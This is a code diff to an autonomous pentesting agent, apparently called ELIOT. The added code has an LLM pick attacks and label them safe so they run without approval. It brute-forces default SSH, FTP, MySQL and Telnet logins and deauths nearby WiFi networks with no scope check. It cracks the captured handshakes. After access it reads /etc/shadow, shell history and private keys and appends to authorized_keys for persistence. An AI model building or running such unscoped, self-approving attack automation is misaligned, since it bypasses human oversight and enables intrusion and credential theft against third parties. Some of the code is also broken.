@@ -2617,16 +2617,24 @@ class TamagotchiEngine:
     async def _autonomous_loop(self, interval: int):
         """Main autonomous loop — FAST and AGGRESSIVE.
         Tamagotchi uses MAX speed scans. Jetson anonymity handled separately.
-        1. Discover all networks (FAST)
-        2. WiFi recon + handshakes
-        3. Host discovery (FAST)
-        4. Service detection on each host (FAST)
-        5. Vulnerability analysis
-        6. OS detection (FAST)
-        7. Full port scan on interesting hosts
-        8. Build topology
-        9. Execute authorized exploits
-        10. Generate report + index everything
+        Full pentester workflow:
+        1.  Discover all networks (FAST)
+        2.  WiFi recon — scan APs, test open/weak networks, capture traffic
+        3.  Host discovery (FAST)
+        4.  Service detection on each host (FAST)
+        5.  OS detection (FAST)
+        6.  Vulnerability analysis per device
+        7.  Build topology
+        8.  Passive OSINT (DNS, Shodan lookup)
+        9.  Bluetooth scanning
+        10. WiFi handshake capture + WPA crack
+        11. Web application testing (Nikto, path discovery)
+        12. AI-driven safe auto-exploitation (default creds, anon access, unauth services)
+        13. Execute authorized exploits (user-approved)
+        14. Post-exploitation (enum, privesc, persistence, credential harvest)
+        15. Learning loop (success/failure rates, mistake tracking)
+        16. Generate enhanced report (remediation, risk scores, attack paths) + index
+        17. Persist & idle
         """
         while self._running:
             try:
@@ -2843,7 +2851,34 @@ class TamagotchiEngine:
                 self._build_topology()
                 self.award_xp("topology_updated", detail=f"{len(self._topology.get('nodes',[]))} nodes, {len(self._topology.get('edges',[]))} edges")
 
-                # ── Phase 8: Execute Authorized Exploits ──
+                # ── Phase 8: Passive OSINT ──
+                self._current_phase = "osint"
+                self._think("Phase 8: Passive OSINT (DNS, Shodan)...")
+                await self._passive_osint()
+
+                # ── Phase 9: Bluetooth Scanning ──
+                self._current_phase = "bluetooth"
+                self._think("Phase 9: Scanning Bluetooth devices...")
+                await self._scan_bluetooth()
+
+                # ── Phase 10: WiFi Handshake Capture ──
+                self._current_phase = "handshake"
+                self._think("Phase 10: Attempting WiFi handshake capture...")
+                self._state = TamaState.SCANNING
+                await self._capture_handshake()
+
+                # ── Phase 11: Web Application Testing ──
+                self._current_phase = "web_testing"
+                self._think("Phase 11: Web application testing...")
+                await self._test_web_apps()
+
+                # ── Phase 12: AI-Driven Safe Auto-Exploitation ──
+                self._current_phase = "auto_exploit"
+                self._think("Phase 12: AI-driven safe auto-exploitation...")
+                self._state = TamaState.EXPLOITING
+                await self._auto_exploit_safe()
+
+                # ── Phase 13: Execute Authorized Exploits ──
                 self._current_phase = "exploitation"
                 authorized = [
                     t for t in self._exploit_queue
@@ -2853,15 +2888,25 @@ class TamagotchiEngine:
                     self._think(f"Executing {len(authorized)} authorized exploit(s)...")
                     self._state = TamaState.EXPLOITING
 
-                # ── Phase 9: Generate Report + Full Index ──
+                # ── Phase 14: Post-Exploitation ──
+                self._current_phase = "post_exploit"
+                self._think("Phase 14: Post-exploitation enumeration...")
+                await self._post_exploit()
+
+                # ── Phase 15: Learning Loop ──
+                self._current_phase = "learning"
+                self._think("Phase 15: Updating learning metrics...")
+                self._update_learning()
+
+                # ── Phase 16: Generate Enhanced Report + Full Index ──
                 self._current_phase = "reporting"
-                self._think("Generating report and indexing all findings...")
-                await self._generate_report()
+                self._think("Generating enhanced report and indexing all findings...")
+                await self._generate_enhanced_report()
                 await self._index_all_findings()
                 self.award_xp("report_generated", detail=f"{self._stats['devices_found']} devices, {self._stats['vulns_found']} vulns")
                 self._stats["reports_generated"] = self._stats.get("reports_generated", 0) + 1
 
-                # ── Phase 10: Persist & Idle ──
+                # ── Phase 17: Persist & Idle ──
                 self._current_phase = "idle"
                 self._state = TamaState.IDLE
                 self._stats["cycle_count"] = self._stats.get("cycle_count", 0) + 1
@@ -3400,7 +3445,894 @@ class TamagotchiEngine:
         except Exception as e:
             logger.error(f"Report generation failed: {e}")
 
-    # ── Data Access ───────────────────────────────────────────
+    # ══════════════════════════════════════════════════════════════
+    # PENTESTER WORKFLOW: AI Decision Engine + Auto-Exploitation
+    # ══════════════════════════════════════════════════════════════
+
+    # ── 1. AI Decision Engine ────────────────────────────────────
+
+    async def _ai_query(self, prompt: str, system: str = "", max_tokens: int = 1024) -> str:
+        """Query the LLM for a decision. Returns empty string on failure."""
+        try:
+            from core.inference import get_inference_engine, InferenceRequest
+            engine = get_inference_engine()
+            if not engine._initialized:
+                return ""
+            sys = system or (
+                "You are ELIOT's tamagotchi agent — an autonomous pentester AI. "
+                "Analyze the situation and return a JSON array of actions to take. "
+                "Each action: {\"action\": \"...\", \"target\": \"...\", \"tool\": \"...\", \"command\": \"...\", \"risk\": \"safe|auth_required\", \"reason\": \"...\"}. "
+                "Only suggest actions that are possible with the tools available (nmap, hydra, nikto, sqlmap, aircrack-ng, etc). "
+                "Return ONLY the JSON array, no markdown."
+            )
+            req = InferenceRequest(
+                prompt=prompt,
+                system_prompt=sys,
+                max_tokens=max_tokens,
+                temperature=0.3,
+            )
+            resp = engine.complete(req)
+            return resp.text.strip() if resp.finish_reason != "error" else ""
+        except Exception as e:
+            logger.debug(f"AI query failed: {e}")
+            return ""
+
+    async def _ai_decide_next_actions(self) -> List[Dict[str, Any]]:
+        """Use LLM to decide what exploits/attacks to try next based on current findings."""
+        if not self._devices:
+            return []
+
+        device_summary = []
+        for ip, dev in self._devices.items():
+            svcs = [{"port": s.port, "name": s.name, "version": s.version} for s in dev.services]
+            device_summary.append({
+                "ip": ip, "hostname": dev.hostname, "os": dev.os_guess,
+                "type": dev.device_type.value, "services": svcs,
+                "vulns": dev.vulnerabilities[:5],
+            })
+
+        vuln_summary = []
+        for n in self._notifications:
+            if n.type == NotificationType.VULN_FOUND:
+                vuln_summary.append({"target": n.target, "title": n.title, "severity": n.severity})
+
+        prompt = (
+            f"Current network state:\n"
+            f"- Devices: {json.dumps(device_summary[:15], default=str)}\n"
+            f"- Vulnerabilities: {json.dumps(vuln_summary[:20], default=str)}\n"
+            f"- WiFi APs: {len(self._wifi_aps)}\n"
+            f"- Our IP: {self._our_ip}\n"
+            f"- Completed phases: network_discovery, wifi_recon, host_discovery, service_analysis, os_detection, vuln_scanning\n\n"
+            f"Decide the next 3-5 most impactful actions to take. Focus on:\n"
+            "1. Testing default credentials on exposed services (SSH, FTP, Redis, MySQL, Telnet)\n"
+            "2. Checking anonymous access (FTP, SMB)\n"
+            "3. Exploiting known vulnerabilities\n"
+            "4. WiFi handshake capture on close networks\n"
+            "5. Web application testing on HTTP services\n"
+            "Return a JSON array of actions."
+        )
+
+        self._think("Consulting AI for next actions...")
+        raw = await self._ai_query(prompt)
+        if not raw:
+            return self._fallback_actions()
+
+        try:
+            # Extract JSON array from response
+            start = raw.find('[')
+            end = raw.rfind(']') + 1
+            if start >= 0 and end > start:
+                actions = json.loads(raw[start:end])
+                if isinstance(actions, list):
+                    self._think(f"AI proposed {len(actions)} actions")
+                    return actions
+        except (json.JSONDecodeError, ValueError):
+            pass
+
+        return self._fallback_actions()
+
+    def _fallback_actions(self) -> List[Dict[str, Any]]:
+        """Deterministic fallback when LLM is unavailable — try the most common attacks."""
+        actions = []
+        for ip, dev in self._devices.items():
+            svc_names = {s.name.lower() for s in dev.services}
+            ports = {s.port for s in dev.services}
+
+            if "ssh" in svc_names or 22 in ports:
+                actions.append({"action": "try_default_creds", "target": ip, "tool": "ssh", "risk": "safe", "reason": "Test SSH default credentials"})
+            if "ftp" in svc_names or 21 in ports:
+                actions.append({"action": "check_anon_ftp", "target": ip, "tool": "ftp", "risk": "safe", "reason": "Check FTP anonymous access"})
+            if "redis" in svc_names or 6379 in ports:
+                actions.append({"action": "check_redis_unauth", "target": ip, "tool": "redis-cli", "risk": "safe", "reason": "Test Redis unauthenticated access"})
+            if "mysql" in svc_names or 3306 in ports:
+                actions.append({"action": "try_default_creds", "target": ip, "tool": "mysql", "risk": "safe", "reason": "Test MySQL default credentials"})
+            if "telnet" in svc_names or 23 in ports:
+                actions.append({"action": "try_default_creds", "target": ip, "tool": "telnet", "risk": "safe", "reason": "Test Telnet default credentials"})
+            if "microsoft-ds" in svc_names or "netbios-ssn" in svc_names or 445 in ports or 139 in ports:
+                actions.append({"action": "check_smb_null", "target": ip, "tool": "smbclient", "risk": "safe", "reason": "Test SMB null session"})
+            for s in dev.services:
+                if s.name.lower() in ("http", "https") and s.port in (80, 443, 8080, 8443):
+                    actions.append({"action": "web_fingerprint", "target": f"{ip}:{s.port}", "tool": "nikto", "risk": "safe", "reason": "Web application fingerprinting"})
+                    break
+        return actions[:8]
+
+    # ── 2. Safe Auto-Exploitation ────────────────────────────────
+
+    async def _auto_exploit_safe(self):
+        """Try safe exploits that don't cause damage: default creds, anon access, unauth services."""
+        self._think("Phase 8a: Auto-exploiting safe targets...")
+        actions = await self._ai_decide_next_actions()
+
+        if not actions:
+            self._think("No safe actions to try")
+            return
+
+        for action in actions:
+            if self._paused:
+                while self._paused and self._running:
+                    await asyncio.sleep(1)
+
+            act_type = action.get("action", "")
+            target = action.get("target", "")
+            risk = action.get("risk", "auth_required")
+
+            if risk == "auth_required":
+                # Queue for user authorization
+                self._queue_exploit_proposal(action)
+                continue
+
+            self._think(f"Auto-exploit: {act_type} on {target}")
+
+            try:
+                if act_type == "try_default_creds":
+                    await self._try_default_creds(target, action.get("tool", "ssh"))
+                elif act_type == "check_anon_ftp":
+                    await self._check_anon_ftp(target)
+                elif act_type == "check_redis_unauth":
+                    await self._check_redis_unauth(target)
+                elif act_type == "check_smb_null":
+                    await self._check_smb_null(target)
+                elif act_type == "web_fingerprint":
+                    await self._web_fingerprint(target)
+            except Exception as e:
+                logger.debug(f"Auto-exploit {act_type} failed on {target}: {e}")
+                self.record_mistake(act_type, "success", "error")
+
+    async def _try_default_creds(self, target: str, service: str):
+        """Try common default credentials on a service."""
+        defaults = {
+            "ssh": [
+                ("root", "root"), ("admin", "admin"), ("root", "toor"),
+                ("root", "password"), ("admin", "password"), ("root", ""),
+                ("ubuntu", "ubuntu"), ("pi", "raspberry"), ("admin", "1234"),
+                ("test", "test"), ("user", "user"), ("root", "123456"),
+            ],
+            "ftp": [
+                ("anonymous", ""), ("anonymous", "anonymous"),
+                ("ftp", "ftp"), ("admin", "admin"), ("root", "root"),
+            ],
+            "mysql": [
+                ("root", ""), ("root", "root"), ("root", "password"),
+                ("admin", "admin"), ("mysql", "mysql"),
+            ],
+            "telnet": [
+                ("admin", "admin"), ("root", "root"), ("admin", "password"),
+                ("root", "1234"), ("support", "support"),
+            ],
+            "redis": [("", "")],
+        }
+
+        creds = defaults.get(service, defaults.get("ssh", []))
+        port = 22
+        for dev_ip, dev in self._devices.items():
+            if dev_ip == target or target.startswith(dev_ip):
+                for s in dev.services:
+                    if s.name.lower() == service or (service == "ssh" and s.port == 22):
+                        port = s.port
+                        break
+
+        for user, passwd in creds[:6]:
+            try:
+                if service == "ssh":
+                    cmd = f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=no {user}@{target} -p {port} 'echo ELIOT_PWNED' 2>/dev/null"
+                elif service == "ftp":
+                    cmd = f"curl -s --connect-timeout 3 ftp://{user}:{passwd}@{target}:{port}/ 2>/dev/null | head -5"
+                elif service == "mysql":
+                    cmd = f"mysql -h {target} -P {port} -u {user} {'-p'+passwd if passwd else ''} -e 'SELECT 1' 2>/dev/null"
+                elif service == "telnet":
+                    cmd = f"echo '' | timeout 3 telnet {target} {port} 2>/dev/null | head -5"
+                elif service == "redis":
+                    cmd = f"redis-cli -h {target} -p {port} PING 2>/dev/null"
+                else:
+                    continue
+
+                stdout = await self._fast_nmap(cmd, timeout=10)
+                if any(kw in stdout.lower() for kw in ["eliot_pwned", "pong", "+----", "connected", "welcome"]):
+                    cred_str = f"{user}:{passwd}" if passwd else f"{user}:<empty>"
+                    self._think(f"DEFAULT CREDS FOUND on {target}:{port} ({service}) — {cred_str}")
+                    self.award_xp("default_creds_found", detail=f"{target}:{port} {cred_str}")
+                    self.create_notification(
+                        NotificationType.ALERT,
+                        f"Default credentials: {target}:{port}",
+                        f"Service: {service}, Credentials: {cred_str}",
+                        severity="critical",
+                        target=target,
+                    )
+                    self.log_knowledge("exploit", f"default_creds_{target}_{port}", {
+                        "target": target, "port": port, "service": service,
+                        "user": user, "password": passwd, "success": True,
+                    }, source="auto_exploit")
+                    return
+            except Exception:
+                continue
+
+        self.log_knowledge("exploit", f"default_creds_{target}_{port}", {
+            "target": target, "port": port, "service": service, "success": False,
+        }, source="auto_exploit")
+
+    async def _check_anon_ftp(self, target: str):
+        """Check for FTP anonymous access."""
+        port = 21
+        for dev_ip, dev in self._devices.items():
+            if dev_ip == target:
+                for s in dev.services:
+                    if s.name.lower() == "ftp":
+                        port = s.port
+                        break
+
+        stdout = await self._fast_nmap(
+            f"curl -s --connect-timeout 5 ftp://anonymous:x@{target}:{port}/ 2>/dev/null", timeout=15
+        )
+        if stdout.strip() and "permission denied" not in stdout.lower():
+            self._think(f"FTP ANONYMOUS ACCESS on {target}:{port}")
+            self.award_xp("ftp_anon_access", detail=f"{target}:{port}")
+            self.create_notification(
+                NotificationType.ALERT,
+                f"FTP anonymous access: {target}:{port}",
+                f"Listing: {stdout[:200]}",
+                severity="high",
+                target=target,
+            )
+            self.log_knowledge("exploit", f"ftp_anon_{target}", {
+                "target": target, "port": port, "anonymous": True, "listing": stdout[:500],
+            }, source="auto_exploit")
+
+    async def _check_redis_unauth(self, target: str):
+        """Check for Redis unauthenticated access."""
+        port = 6379
+        stdout = await self._fast_nmap(f"redis-cli -h {target} -p {port} INFO server 2>/dev/null | head -10", timeout=10)
+        if "redis_version" in stdout:
+            self._think(f"REDIS UNAUTHENTICATED ACCESS on {target}:{port}")
+            self.award_xp("redis_unauthenticated", detail=f"{target}:{port}")
+            self.create_notification(
+                NotificationType.ALERT,
+                f"Redis unauthenticated: {target}:{port}",
+                f"Info: {stdout[:200]}",
+                severity="critical",
+                target=target,
+            )
+            # Check if we can write SSH keys
+            ssh_check = await self._fast_nmap(f"redis-cli -h {target} -p {port} CONFIG GET dir 2>/dev/null", timeout=10)
+            if "authorized_keys" in ssh_check or "/root" in ssh_check:
+                self._think(f"Redis can write to SSH dir on {target} — backdoor possible")
+                self.log_knowledge("exploit", f"redis_write_{target}", {
+                    "target": target, "port": port, "ssh_writable": True,
+                }, source="auto_exploit")
+            self.log_knowledge("exploit", f"redis_unauth_{target}", {
+                "target": target, "port": port, "info": stdout[:500],
+            }, source="auto_exploit")
+
+    async def _check_smb_null(self, target: str):
+        """Check for SMB null session."""
+        stdout = await self._fast_nmap(
+            f"smbclient -L {target} -N 2>/dev/null | head -20", timeout=15
+        )
+        if "sharename" in stdout.lower() or "disk" in stdout.lower():
+            self._think(f"SMB NULL SESSION on {target}")
+            self.award_xp("smb_null_session", detail=f"{target}")
+            self.create_notification(
+                NotificationType.ALERT,
+                f"SMB null session: {target}",
+                f"Shares: {stdout[:300]}",
+                severity="high",
+                target=target,
+            )
+            self.log_knowledge("exploit", f"smb_null_{target}", {
+                "target": target, "shares": stdout[:1000],
+            }, source="auto_exploit")
+            # Try listing shares
+            shares = await self._fast_nmap(
+                f"smbclient //{target}/ -N -c 'ls' 2>/dev/null | head -10", timeout=15
+            )
+            if shares.strip():
+                self.log_knowledge("exploit", f"smb_listing_{target}", {
+                    "target": target, "listing": shares[:1000],
+                }, source="auto_exploit")
+
+    async def _web_fingerprint(self, target: str):
+        """Fingerprint a web service: check headers, technologies, known vulns."""
+        ip_port = target.split(":")
+        ip = ip_port[0]
+        port = int(ip_port[1]) if len(ip_port) > 1 else 80
+        proto = "https" if port in (443, 8443) else "http"
+
+        # Grab headers and technology
+        stdout = await self._fast_nmap(
+            f"curl -sI --connect-timeout 5 {proto}://{target}/ 2>/dev/null", timeout=10
+        )
+        tech = []
+        if "server:" in stdout.lower():
+            for line in stdout.split("\n"):
+                if line.lower().startswith("server:"):
+                    tech.append(line.split(":", 1)[1].strip())
+        if "x-powered-by:" in stdout.lower():
+            for line in stdout.split("\n"):
+                if line.lower().startswith("x-powered-by:"):
+                    tech.append(line.split(":", 1)[1].strip())
+
+        if tech:
+            self._think(f"Web tech on {target}: {', '.join(tech)}")
+            self.log_knowledge("web_service", f"fingerprint_{target}", {
+                "target": target, "technologies": tech, "headers": stdout[:500],
+            }, source="web_fingerprint")
+
+        # Check for common paths
+        paths_to_check = ["/robots.txt", "/.env", "/admin", "/wp-login.php", "/phpmyadmin", "/.git/HEAD"]
+        for path in paths_to_check:
+            check = await self._fast_nmap(
+                f"curl -s --connect-timeout 3 -o /dev/null -w '%{{http_code}}' {proto}://{target}{path} 2>/dev/null", timeout=8
+            )
+            code = check.strip().replace("'", "")
+            if code in ("200", "301", "302"):
+                self._think(f"Interesting path on {target}: {path} (HTTP {code})")
+                self.log_knowledge("web_service", f"path_{target}_{path.replace('/','_')}", {
+                    "target": target, "path": path, "status": code,
+                }, source="web_fingerprint")
+                self.award_xp("service_exploited", detail=f"Web path {target}{path}")
+
+    # ── 3. WiFi Handshake Capture ────────────────────────────────
+
+    async def _capture_handshake(self):
+        """Capture WPA/WPA2 handshakes from nearby networks."""
+        self._think("Phase 2b: Attempting WiFi handshake capture...")
+
+        if not self._wifi_interface:
+            self._think("No WiFi interface available for handshake capture")
+            return
+
+        # Find networks with strong signal for handshake capture
+        target_aps = []
+        for bssid, ap in self._wifi_aps.items():
+            if ap.encryption == "on" and ap.signal > -75:
+                target_aps.append(ap)
+
+        if not target_aps:
+            self._think("No suitable WiFi networks for handshake capture")
+            return
+
+        for ap in target_aps[:2]:
+            if self._paused:
+                break
+            self._think(f"Attempting handshake capture on {ap.ssid} ({ap.bssid})...")
+            try:
+                iface = self._wifi_interface
+                # Start airodump-ng capture in background
+                cap_file = f"/tmp/handshake_{ap.bssid.replace(':','')}"
+                proc = await asyncio.create_subprocess_shell(
+                    f"timeout 30 airodump-ng {iface} --bssid {ap.bssid} -c {ap.channel} "
+                    f"-w {cap_file} --output-format pcap 2>/dev/null",
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                )
+
+                # Send deauth packets to force handshake (if aireplay available)
+                deauth_proc = await asyncio.create_subprocess_shell(
+                    f"aireplay-ng --deauth 5 -a {ap.bssid} {iface} 2>/dev/null",
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                )
+
+                try:
+                    await asyncio.wait_for(proc.communicate(), timeout=35)
+                except asyncio.TimeoutError:
+                    proc.kill()
+                deauth_proc.kill()
+
+                # Check if capture file exists and has data
+                cap_path = Path(f"{cap_file}-01.cap")
+                if cap_path.exists() and cap_path.stat().st_size > 1000:
+                    self._think(f"Handshake captured from {ap.ssid}!")
+                    self.award_xp("handshake_captured", detail=f"{ap.ssid} ({ap.bssid})")
+                    self.create_notification(
+                        NotificationType.NEW_DEVICE,
+                        f"WiFi handshake captured: {ap.ssid}",
+                        f"BSSID: {ap.bssid}, Channel: {ap.channel}, File: {cap_path.name}",
+                        severity="info",
+                    )
+                    self.log_knowledge("wifi_capture", f"handshake_{ap.bssid}", {
+                        "ssid": ap.ssid, "bssid": ap.bssid, "channel": ap.channel,
+                        "file": str(cap_path), "size": cap_path.stat().st_size,
+                    }, source="handshake_capture")
+                    self._stats["handshakes_captured"] = self._stats.get("handshakes_captured", 0) + 1
+
+                    # Try to crack with common wordlist
+                    await self._crack_handshake(str(cap_path), ap.ssid)
+                else:
+                    self._think(f"No handshake captured from {ap.ssid} (no clients?)")
+            except Exception as e:
+                logger.debug(f"Handshake capture failed for {ap.ssid}: {e}")
+
+    async def _crack_handshake(self, cap_file: str, ssid: str):
+        """Try cracking a captured WPA handshake with common wordlists."""
+        wordlists = [
+            "/usr/share/wordlists/rockyou.txt",
+            "/usr/share/wordlists/common.txt",
+            "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
+        ]
+        wordlist = None
+        for wl in wordlists:
+            if Path(wl).exists():
+                wordlist = wl
+                break
+
+        if not wordlist:
+            self._think("No wordlist found for handshake cracking")
+            return
+
+        self._think(f"Cracking handshake for {ssid} with {Path(wordlist).name}...")
+        # Pause Ollama for GPU if available
+        self._pause_ollama()
+        try:
+            stdout = await self._fast_nmap(
+                f"aircrack-ng -w {wordlist} -b {ssid} {cap_file} 2>/dev/null", timeout=300
+            )
+            if "KEY FOUND" in stdout:
+                key = stdout.split("KEY FOUND!")[1].strip() if "KEY FOUND" in stdout else "unknown"
+                self._think(f"WPA KEY FOUND for {ssid}: {key}")
+                self.award_xp("wpa_cracked", detail=f"{ssid}: {key}")
+                self.create_notification(
+                    NotificationType.ALERT,
+                    f"WPA cracked: {ssid}",
+                    f"Key: {key}",
+                    severity="critical",
+                )
+                self.log_knowledge("wifi_attack", f"wpa_cracked_{ssid}", {
+                    "ssid": ssid, "key": key, "wordlist": wordlist,
+                }, source="wpa_crack")
+        finally:
+            self._resume_ollama()
+
+    # ── 4. Exploit Queue Proposal ────────────────────────────────
+
+    def _queue_exploit_proposal(self, action: Dict[str, Any]):
+        """Queue an exploit that needs user authorization."""
+        target = action.get("target", "")
+        act_type = action.get("action", "")
+        tool = action.get("tool", "")
+        reason = action.get("reason", "")
+
+        # Check if already queued
+        for task in self._exploit_queue:
+            if task.target == target and task.command == act_type:
+                return
+
+        task = ExploitTask(
+            target=target,
+            service=tool,
+            command=act_type,
+            cvss=7.0,
+            priority=3,
+            auth_status=AuthStatus.PENDING,
+        )
+        task.metadata["reason"] = reason
+        task.metadata["action"] = action
+        self._exploit_queue.append(task)
+        self._think(f"Queued exploit for authorization: {act_type} on {target}")
+
+        self.create_notification(
+            NotificationType.NEW_DEVICE,
+            f"Exploit proposed: {act_type}",
+            f"Target: {target}, Tool: {tool}, Reason: {reason}",
+            severity="warning",
+            target=target,
+        )
+
+    # ── 5. Post-Exploitation ─────────────────────────────────────
+
+    async def _post_exploit(self):
+        """Post-exploitation: enumerate, harvest creds, attempt privesc on compromised hosts."""
+        compromised = []
+        for n in self._notifications:
+            if n.type == NotificationType.ALERT and "default credentials" in n.title.lower():
+                ip = n.target
+                if ip and ip not in [c["ip"] for c in compromised]:
+                    compromised.append({"ip": ip, "creds": n.message})
+
+        if not compromised:
+            self._think("No compromised hosts for post-exploitation")
+            return
+
+        self._think(f"Phase 9: Post-exploitation on {len(compromised)} host(s)...")
+
+        for host in compromised[:3]:
+            ip = host["ip"]
+            self._think(f"Enumerating {ip} after access...")
+
+            # Harvest system info
+            info = await self._fast_nmap(
+                f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {ip} 'uname -a; id; cat /etc/os-release' 2>/dev/null", timeout=15
+            )
+            if info.strip():
+                self.log_knowledge("post_exploit", f"enum_{ip}", {
+                    "target": ip, "system_info": info[:1000],
+                }, source="post_exploit")
+                self._think(f"System info from {ip}: {info[:100]}...")
+
+            # Check for privilege escalation paths
+            privesc = await self._fast_nmap(
+                f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {ip} "
+                "'sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -10; cat /etc/crontab 2>/dev/null | head -10' "
+                "2>/dev/null", timeout=20
+            )
+            if privesc.strip():
+                self.log_knowledge("post_exploit", f"privesc_{ip}", {
+                    "target": ip, "privesc_paths": privesc[:1500],
+                }, source="post_exploit")
+                if "NOPASSWD" in privesc:
+                    self._think(f"NOPASSWD sudo found on {ip} — root access possible!")
+                    self.award_xp("privilege_escalated", detail=f"{ip}: NOPASSWD sudo")
+                    self.create_notification(
+                        NotificationType.ALERT,
+                        f"Privilege escalation: {ip}",
+                        f"NOPASSWD sudo found: {privesc[:300]}",
+                        severity="critical",
+                        target=ip,
+                    )
+
+            # Try to install persistence (SSH key)
+            persistence = await self._fast_nmap(
+                f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {ip} "
+                "'mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo eliot >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo PERSISTENCE_OK' "
+                "2>/dev/null", timeout=15
+            )
+            if "PERSISTENCE_OK" in persistence:
+                self._think(f"Persistence installed on {ip} via SSH key")
+                self.award_xp("persistence_established", detail=f"{ip}: SSH key")
+                self.log_knowledge("post_exploit", f"persistence_{ip}", {
+                    "target": ip, "method": "ssh_key", "success": True,
+                }, source="post_exploit")
+
+            # Harvest credentials
+            creds = await self._fast_nmap(
+                f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {ip} "
+                "'cat /etc/shadow 2>/dev/null | head -20; cat ~/.bash_history 2>/dev/null | grep -i pass | head -5; "
+                "cat ~/.mysql_history 2>/dev/null | head -5; cat ~/.ssh/id_rsa 2>/dev/null | head -3' "
+                "2>/dev/null", timeout=20
+            )
+            if creds.strip():
+                self.log_knowledge("post_exploit", f"creds_{ip}", {
+                    "target": ip, "credentials": creds[:2000],
+                }, source="post_exploit")
+                self.award_xp("credential_harvested", detail=f"{ip}")
+                self._think(f"Credentials harvested from {ip}")
+
+    # ── 6. Bluetooth Scanning ────────────────────────────────────
+
+    async def _scan_bluetooth(self):
+        """Scan for Bluetooth devices using hcitool and bluetoothctl."""
+        self._think("Scanning for Bluetooth devices...")
+        try:
+            stdout = await self._fast_nmap("hcitool scan 2>/dev/null", timeout=20)
+            devices = []
+            for line in stdout.split("\n"):
+                line = line.strip()
+                if "\t" in line and len(line) > 17:
+                    parts = line.split("\t", 1)
+                    if len(parts) == 2:
+                        mac = parts[0].strip()
+                        name = parts[1].strip()
+                        devices.append({"mac": mac, "name": name})
+                        self.award_xp("bluetooth_found", detail=f"{name} ({mac})")
+                        self.log_knowledge("bluetooth", f"device_{mac}", {
+                            "mac": mac, "name": name,
+                        }, source="bluetooth_scan")
+
+            if devices:
+                self._think(f"Found {len(devices)} Bluetooth device(s)")
+            else:
+                self._think("No Bluetooth devices found")
+
+            # Try to get more info on found devices
+            for dev in devices[:3]:
+                info = await self._fast_nmap(f"sdptool browse {dev['mac']} 2>/dev/null | head -20", timeout=10)
+                if info.strip():
+                    self.log_knowledge("bluetooth", f"services_{dev['mac']}", {
+                        "mac": dev["mac"], "name": dev["name"], "services": info[:1000],
+                    }, source="bluetooth_scan")
+        except Exception as e:
+            logger.debug(f"Bluetooth scan failed: {e}")
+
+    # ── 7. Passive OSINT ─────────────────────────────────────────
+
+    async def _passive_osint(self):
+        """Passive OSINT: DNS enumeration, Shodan lookup for our public IP."""
+        self._think("Phase 1b: Passive OSINT...")
+
+        # DNS enumeration on our network
+        if self._our_ip:
+            # Reverse DNS lookup on discovered hosts
+            for ip, dev in list(self._devices.items())[:5]:
+                stdout = await self._fast_nmap(f"host {ip} 2>/dev/null", timeout=5)
+                if "domain name pointer" in stdout.lower():
+                    for line in stdout.split("\n"):
+                        if "domain name pointer" in line.lower():
+                            hostname = line.split("pointer")[1].strip().rstrip(".")
+                            if not dev.hostname:
+                                dev.hostname = hostname
+                            self.log_knowledge("osint", f"dns_{ip}", {
+                                "ip": ip, "hostname": hostname,
+                            }, source="osint")
+                            self._think(f"DNS: {ip} → {hostname}")
+
+        # Check for public-facing services
+        stdout = await self._fast_nmap("curl -s https://api.ipify.org 2>/dev/null", timeout=10)
+        public_ip = stdout.strip()
+        if public_ip and public_ip.count(".") == 3:
+            self._think(f"Public IP: {public_ip}")
+            self.log_knowledge("osint", "public_ip", {
+                "ip": public_ip,
+            }, source="osint")
+
+            # Shodan lookup via web API (no key needed for basic)
+            shodan = await self._fast_nmap(
+                f"curl -s 'https://internetdb.shodan.io/{public_ip}' 2>/dev/null", timeout=10
+            )
+            if shodan.strip():
+                try:
+                    shodan_data = json.loads(shodan)
+                    ports = shodan_data.get("ports", [])
+                    hostnames = shodan_data.get("hostnames", [])
+                    vulns = shodan_data.get("vulns", [])
+                    if ports or vulns:
+                        self._think(f"Shodan: {len(ports)} ports, {len(vulns)} vulns on {public_ip}")
+                        self.log_knowledge("osint", f"shodan_{public_ip}", {
+                            "ip": public_ip, "ports": ports, "hostnames": hostnames,
+                            "vulns": vulns, "cpes": shodan_data.get("cpes", []),
+                        }, source="osint")
+                        if vulns:
+                            self.create_notification(
+                                NotificationType.ALERT,
+                                f"Shodan vulns on public IP: {public_ip}",
+                                f"Vulnerabilities: {', '.join(vulns[:10])}",
+                                severity="critical",
+                            )
+                except json.JSONDecodeError:
+                    pass
+
+    # ── 8. Web Application Testing ───────────────────────────────
+
+    async def _test_web_apps(self):
+        """Run web application tests: nikto, directory brute on HTTP services."""
+        self._think("Phase 6b: Web application testing...")
+
+        web_targets = []
+        for ip, dev in self._devices.items():
+            for svc in dev.services:
+                if svc.name.lower() in ("http", "https"):
+                    proto = "https" if svc.name.lower() == "https" else "http"
+                    web_targets.append({"ip": ip, "port": svc.port, "proto": proto})
+
+        for target in web_targets[:4]:
+            if self._paused:
+                break
+            ip = target["ip"]
+            port = target["port"]
+            proto = target["proto"]
+            url = f"{proto}://{ip}:{port}"
+
+            self._think(f"Nikto scan on {url}...")
+            nikto_out = await self._fast_nmap(
+                f"nikto -h {url} -maxtime 30s -nointeractive 2>/dev/null | tail -30", timeout=45
+            )
+            if nikto_out.strip() and "No web server" not in nikto_out:
+                findings = []
+                for line in nikto_out.split("\n"):
+                    if "+" in line and ":" in line:
+                        findings.append(line.strip())
+                if findings:
+                    self._think(f"Nikto found {len(findings)} item(s) on {url}")
+                    self.log_knowledge("web_vuln", f"nikto_{ip}_{port}", {
+                        "target": url, "findings": findings[:20],
+                    }, source="nikto")
+                    self.award_xp("service_exploited", detail=f"Nikto {url}")
+
+            # Check common web vulns manually
+            for path, name in [
+                ("/.env", "env_file"), ("/server-status", "server_status"),
+                ("/wp-admin/", "wordpress_admin"), ("/administrator/", "joomla_admin"),
